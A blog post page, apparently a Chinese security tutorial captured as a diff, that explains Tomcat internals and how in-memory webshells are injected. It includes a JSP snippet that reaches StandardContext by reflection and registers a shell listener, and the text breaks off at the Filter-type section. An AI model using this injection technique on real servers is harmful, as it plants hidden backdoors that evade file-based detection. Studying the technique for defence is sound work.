@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"mayylu.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.8.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="前言内存马是指一种只在内存中运行，没有文件落地或者运行后能够删除自身的木马">
+<meta property="og:type" content="article">
+<meta property="og:title" content="javaweb 内存马">
+<meta property="og:url" content="https://mayylu.github.io/2023/10/16/java/javaweb%20%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
+<meta property="og:site_name" content="mayylu">
+<meta property="og:description" content="前言内存马是指一种只在内存中运行，没有文件落地或者运行后能够删除自身的木马">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/Tomcat-2.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/4.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/72.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/1-795x1500.jpg">
+<meta property="article:published_time" content="2023-10-16T07:20:19.000Z">
+<meta property="article:modified_time" content="2023-10-27T09:52:32.064Z">
+<meta property="article:author" content="mayylu">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/Tomcat-2.png">
+
+
+<link rel="canonical" href="https://mayylu.github.io/2023/10/16/java/javaweb%20%E5%86%85%E5%AD%98%E9%A9%AC/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://mayylu.github.io/2023/10/16/java/javaweb%20%E5%86%85%E5%AD%98%E9%A9%AC/","path":"2023/10/16/java/javaweb 内存马/","title":"javaweb 内存马"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>javaweb 内存马 | mayylu</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">mayylu</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">12</span></a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">9</span></a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#servlet-api"><span class="nav-number">2.</span> <span class="nav-text">servlet-api</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0%E9%85%8D%E7%BD%AE"><span class="nav-number">2.1.</span> <span class="nav-text">添加配置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Tomcat"><span class="nav-number">2.2.</span> <span class="nav-text">Tomcat</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Tomcat%E5%9F%BA%E7%A1%80"><span class="nav-number">2.2.1.</span> <span class="nav-text">Tomcat基础</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Service"><span class="nav-number">2.2.1.1.</span> <span class="nav-text">Service</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Connector"><span class="nav-number">2.2.1.2.</span> <span class="nav-text">Connector</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Container"><span class="nav-number">2.2.1.3.</span> <span class="nav-text">Container</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Context"><span class="nav-number">2.2.1.3.1.</span> <span class="nav-text">Context</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Tomcat%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">2.2.2.</span> <span class="nav-text">Tomcat内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Listener%E5%9E%8B"><span class="nav-number">2.2.2.1.</span> <span class="nav-text">Listener型</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#StandardContext"><span class="nav-number">2.2.2.1.1.</span> <span class="nav-text">StandardContext</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B"><span class="nav-number">2.2.2.1.2.</span> <span class="nav-text">示例</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Filter%E5%9E%8B"><span class="nav-number">2.2.2.2.</span> <span class="nav-text">Filter型</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#ApplicationFilterChain"><span class="nav-number">2.2.2.2.1.</span> <span class="nav-text">ApplicationFilterChain</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ApplicationFilterFactory"><span class="nav-number">2.2.2.2.2.</span> <span class="nav-text">ApplicationFilterFactory</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B-1"><span class="nav-number">2.2.2.2.3.</span> <span class="nav-text">示例</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#servlet"><span class="nav-number">2.2.2.3.</span> <span class="nav-text">servlet</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#ContextConfig"><span class="nav-number">2.2.2.3.1.</span> <span class="nav-text">ContextConfig</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B-2"><span class="nav-number">2.2.2.3.2.</span> <span class="nav-text">示例</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">2.2.3.</span> <span class="nav-text">Java Agent内存马</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">mayylu</p>
+  <div class="site-description" itemprop="description">学习是一种生活态度</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">37</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://mayylu.github.io/2023/10/16/java/javaweb%20%E5%86%85%E5%AD%98%E9%A9%AC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="mayylu">
+      <meta itemprop="description" content="学习是一种生活态度">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mayylu">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          javaweb 内存马
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-10-16 15:20:19" itemprop="dateCreated datePublished" datetime="2023-10-16T15:20:19+08:00">2023-10-16</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2023-10-27 17:52:32" itemprop="dateModified" datetime="2023-10-27T17:52:32+08:00">2023-10-27</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/java/" itemprop="url" rel="index"><span itemprop="name">java</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>内存马是指一种只在内存中运行，没有文件落地或者运行后能够删除自身的木马<br> <span id="more"></span></p>
+<h1 id="servlet-api"><a href="#servlet-api" class="headerlink" title="servlet-api"></a>servlet-api</h1><p>Servlet，Filter，Listener 由 javax.servlet.ServletContext 去加载，在不同的容器中，实现有所不同，这里仅以 Tomcat 为例进行调试</p>
+<h2 id="添加配置"><a href="#添加配置" class="headerlink" title="添加配置"></a>添加配置</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.5.85<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>没这个配置javacc也能跑但是看不了底层</p>
+<h2 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h2><p>Tomcat Server大致可以分为三个组件，Service、Connector、Container<br><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/Tomcat-2.png" alt="Tomcat-2"></p>
+<h3 id="Tomcat基础"><a href="#Tomcat基础" class="headerlink" title="Tomcat基础"></a>Tomcat基础</h3><h4 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h4><p>其中一个Tomcat Server可以包含多个Service，比如Tomcat默认的Service服务Catalina。每一个Service都是独立的，他们共享一个JVM以及系统类库，并且一个Service负责维护多个Connector和一个Container。</p>
+<h4 id="Connector"><a href="#Connector" class="headerlink" title="Connector"></a>Connector</h4><p><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/4.png" alt="4"><br>Connector用于连接Service和Container，解析客户端的请求并转发到Container，以及转发来自Container的响应。每一种不同的Connector都可以处理不同的请求协议，包括HTTP/1.1、HTTP/2、AJP等等。</p>
+<h4 id="Container"><a href="#Container" class="headerlink" title="Container"></a>Container</h4><p>Tomcat的Container包含四种子容器：<strong>Engine</strong>、<strong>Host</strong>、<strong>Context</strong>和<strong>Wrapper</strong>，在Tomcat源码中我们可以清晰地看到各容器之间的继承关系<br><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/72.png" alt="72"><br>在Tomcat中，Context是Container组件的一种子容器，其对应的是一个Web应用。Context中可以包含多个Wrapper容器，而Wrapper对应的是一个具体的Servlet定义。因此Context可以用来保存一个Web应用中多个Servlet的上下文信息。</p>
+<h5 id="Context"><a href="#Context" class="headerlink" title="Context"></a>Context</h5><p><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/1-795x1500.jpg" alt="1-795x1500"><br><strong>ServletContext接口</strong>的实现类为<strong>ApplicationContext类</strong>和ApplicationContextFacade类，其中ApplicationContextFacade是对ApplicationContext类的包装。在ApplicationContext类中，对资源的各种操作实际上是调用了<strong>StandardContext</strong>中的方法，因此StandardContext是Tomcat中负责与底层交互的Context。</p>
+<h3 id="Tomcat内存马"><a href="#Tomcat内存马" class="headerlink" title="Tomcat内存马"></a>Tomcat内存马</h3><p>Tomcat内存马的核心原理就是动态地将恶意组件添加到正在运行的Tomcat服务器中。</p>
+<p>而这一技术的实现有赖于官方对Servlet3.0的升级，Servlet在3.0版本之后能够支持动态注册组件。而Tomcat直到7.x才支持Servlet3.0，因此通过动态添加恶意组件注入内存马的方式适合Tomcat7.x及以上</p>
+<h4 id="Listener型"><a href="#Listener型" class="headerlink" title="Listener型"></a>Listener型</h4><p>ServletRequestListener非常适合用来作为内存马,当我们访问任意资源时，都会触发ServletRequestListener#requestInitialized()方法,下面以ServletRequestListener为例</p>
+<h5 id="StandardContext"><a href="#StandardContext" class="headerlink" title="StandardContext"></a>StandardContext</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> List&lt;Object&gt; applicationEventListenersList = <span class="keyword">new</span> CopyOnWriteArrayList();</span><br><span class="line"><span class="keyword">private</span> HashMap&lt;String, ApplicationFilterConfig&gt; filterConfigs = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line"><span class="comment">//StandardContext.fireRequestInitEvent() 方法是 Tomcat 在请求初始化阶段触发的事件之一。它负责向所有监听器发送一个 ServletRequestEvent 事件，并初始化所以的监听器</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">fireRequestInitEvent</span><span class="params">(ServletRequest request)</span> </span>&#123;<span class="comment">//ServletRequest为请求</span></span><br><span class="line">        Object[] instances = <span class="keyword">this</span>.getApplicationEventListeners();<span class="comment">//getApplicationEventListeners获取所以的监听器</span></span><br><span class="line">        <span class="keyword">if</span> (instances != <span class="keyword">null</span> &amp;&amp; instances.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            ServletRequestEvent event = <span class="keyword">new</span> ServletRequestEvent(<span class="keyword">this</span>.getServletContext(), request);</span><br><span class="line">            Object[] var4 = instances;</span><br><span class="line">            <span class="keyword">int</span> var5 = instances.length;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> var6 = <span class="number">0</span>; var6 &lt; var5; ++var6) &#123;</span><br><span class="line">                Object instance = var4[var6];</span><br><span class="line">                <span class="keyword">if</span> (instance != <span class="keyword">null</span> &amp;&amp; instance <span class="keyword">instanceof</span> ServletRequestListener) &#123;</span><br><span class="line">                    ServletRequestListener listener = (ServletRequestListener)instance;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        listener.requestInitialized(event);<span class="comment">//这里触发了ServletRequestListener的requestInitialized方法</span></span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Throwable var10) &#123;</span><br><span class="line">                        ExceptionUtils.handleThrowable(var10);</span><br><span class="line">                        <span class="keyword">this</span>.getLogger().error(sm.getString(<span class="string">&quot;standardContext.requestListener.requestInit&quot;</span>, <span class="keyword">new</span> Object[]&#123;instance.getClass().getName()&#125;), var10);</span><br><span class="line">                        request.setAttribute(<span class="string">&quot;javax.servlet.error.exception&quot;</span>, var10);</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> Object[] getApplicationEventListeners() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.applicationEventListenersList.toArray();<span class="comment">//可以看到Listener实际上是存储在applicationEventListenersList属性</span></span><br><span class="line">    &#125;</span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addApplicationEventListener</span><span class="params">(Object listener)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.applicationEventListenersList.add(listener);<span class="comment">//我们可以通过StandardContext#addApplicationEventListener()方法来添加我们自己的Listener</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> FilterConfig <span class="title">findFilterConfig</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (FilterConfig)<span class="keyword">this</span>.filterConfigs.get(name);<span class="comment">//根据FilterMap中的信息从filterConfigs中提取ApplicationFilterConfig</span></span><br><span class="line">    &#125;</span><br><span class="line">.....</span><br><span class="line"><span class="comment">//调用以启动 Web 应用程序的上下文环境</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">startInternal</span><span class="params">()</span> <span class="keyword">throws</span> LifecycleException </span>&#123;</span><br><span class="line">         <span class="keyword">if</span> (ok &amp;&amp; !<span class="keyword">this</span>.listenerStart()) &#123;</span><br><span class="line">                log.error(sm.getString(<span class="string">&quot;standardContext.listenerFail&quot;</span>));</span><br><span class="line">                ok = <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ok) &#123;</span><br><span class="line">                <span class="keyword">this</span>.checkConstraintsForUncoveredMethods(<span class="keyword">this</span>.findConstraints());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Manager manager = <span class="keyword">this</span>.getManager();</span><br><span class="line">                <span class="keyword">if</span> (manager <span class="keyword">instanceof</span> Lifecycle) &#123;</span><br><span class="line">                    ((Lifecycle)manager).start();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var18) &#123;</span><br><span class="line">                log.error(sm.getString(<span class="string">&quot;standardContext.managerFail&quot;</span>), var18);</span><br><span class="line">                ok = <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ok &amp;&amp; !<span class="keyword">this</span>.filterStart()) &#123;</span><br><span class="line">                log.error(sm.getString(<span class="string">&quot;standardContext.filterFail&quot;</span>));</span><br><span class="line">                ok = <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ok &amp;&amp; !<span class="keyword">this</span>.loadOnStartup(<span class="keyword">this</span>.findChildren())) &#123;<span class="comment">//前面已经完成了将所有 servlet 添加到 context 的 children 中，this.findChildren()即把所有Wapper传入loadOnStartup()中处理</span></span><br><span class="line">                log.error(sm.getString(<span class="string">&quot;standardContext.servletFail&quot;</span>));</span><br><span class="line">                ok = <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    .....</span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">loadOnStartup</span><span class="params">(Container[] children)</span> </span>&#123;</span><br><span class="line">        TreeMap&lt;Integer, ArrayList&lt;Wrapper&gt;&gt; map = <span class="keyword">new</span> TreeMap();</span><br><span class="line">        Container[] var3 = children;</span><br><span class="line">        <span class="keyword">int</span> var4 = children.length;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> var5 = <span class="number">0</span>; var5 &lt; var4; ++var5) &#123;</span><br><span class="line">            Container child = var3[var5];</span><br><span class="line">            Wrapper wrapper = (Wrapper)child;</span><br><span class="line">            <span class="keyword">int</span> loadOnStartup = wrapper.getLoadOnStartup();</span><br><span class="line">            <span class="keyword">if</span> (loadOnStartup &gt;= <span class="number">0</span>) &#123;<span class="comment">//选出loadOnStartup &gt;= 0 的项以其为键加载含有对应Wrapper的list为值</span></span><br><span class="line">            <span class="comment">//这里对应的实际上就是Tomcat Servlet的懒加载机制，可以通过loadOnStartup属性值来设置每个Servlet的启动顺序。默认值为-1，此时只有当Servlet被调用时才加载到内存中。</span></span><br><span class="line">                Integer key = loadOnStartup;</span><br><span class="line">                ArrayList&lt;Wrapper&gt; list = (ArrayList)map.get(key);</span><br><span class="line">                <span class="keyword">if</span> (list == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    list = <span class="keyword">new</span> ArrayList();</span><br><span class="line">                    map.put(key, list);<span class="comment">//</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                list.add(wrapper);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Iterator var12 = map.values().iterator();<span class="comment">//获取值的迭代器对象</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(var12.hasNext()) &#123;</span><br><span class="line">            ArrayList&lt;Wrapper&gt; list = (ArrayList)var12.next();</span><br><span class="line">            Iterator var14 = list.iterator();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(var14.hasNext()) &#123;</span><br><span class="line">                Wrapper wrapper = (Wrapper)var14.next();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    wrapper.load();<span class="comment">//在这里会把wrapper给加载了</span></span><br></pre></td></tr></table></figure>
+<h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><p>方法一</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    Field reqF = request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);<span class="comment">//RequestFacade的request字段是个Request对象</span></span><br><span class="line">    reqF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Request req = (Request) reqF.get(request);</span><br><span class="line">    StandardContext context = (StandardContext) req.getContext();<span class="comment">//用Request类的getContext方法</span></span><br><span class="line"> </span><br><span class="line">    Shell_Listener shell_Listener = <span class="keyword">new</span> Shell_Listener();</span><br><span class="line">    context.addApplicationEventListener(shell_Listener);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<p>方法二</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();</span><br></pre></td></tr></table></figure>
+<h4 id="Filter型"><a href="#Filter型" class="headerlink" title="Filter型"></a>Filter型</h4><h5 id="ApplicationFilterChain"><a href="#ApplicationFilterChain" class="headerlink" title="ApplicationFilterChain"></a>ApplicationFilterChain</h5><p>ApplicationFilterChain 类是 Servlet 容器中过滤器链的核心部分，它负责管理和执行过滤器链中的过滤器。当一个请求到达容器时，容器会将该请求交给 ApplicationFilterChain 处理。</p>
+<p>ApplicationFilterChain 的 <strong>internalDoFilter</strong> 方法负责按照过滤器链的顺序执行每个过滤器的 doFilter 方法，并处理过滤器链的流程控制。</p>
